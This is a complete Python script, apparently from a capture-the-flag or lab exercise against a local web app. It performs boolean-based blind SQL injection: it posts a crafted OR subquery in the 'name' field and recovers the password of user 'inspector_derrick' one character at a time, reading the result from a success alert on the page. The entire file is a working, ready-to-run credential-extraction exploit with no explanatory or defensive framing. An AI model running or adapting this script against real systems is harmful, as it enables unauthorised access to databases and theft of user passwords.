from string import digits, ascii_uppercase, ascii_lowercase
from bs4 import BeautifulSoup
import requests

chars = digits + ascii_uppercase + ascii_lowercase
url = 'http://localhost/messages'


def exists(char):
    query = "' OR 1 = (SELECT COUNT(*) FROM users WHERE name='inspector_derrick' AND password LIKE BINARY '{}%') OR 1 = '0".format(char)
    res = requests.post(url, data={'name': query})
    c = res.content
    soup = BeautifulSoup(c, "html.parser")
    elem = soup.find("div", {"class": "alert alert-success"})
    if elem:
        return True
    else:
        return False


def find_char(base):
    for c in chars:
        if exists("{}{}".format(base, c)):
            return c
        elif c == 'z':
            return -1


def main():
    passwd = ''
    while True:
        c = find_char(passwd)
        if c == -1:
            break
        else:
            passwd += c
    print(passwd)


if __name__ == '__main__':
    main()
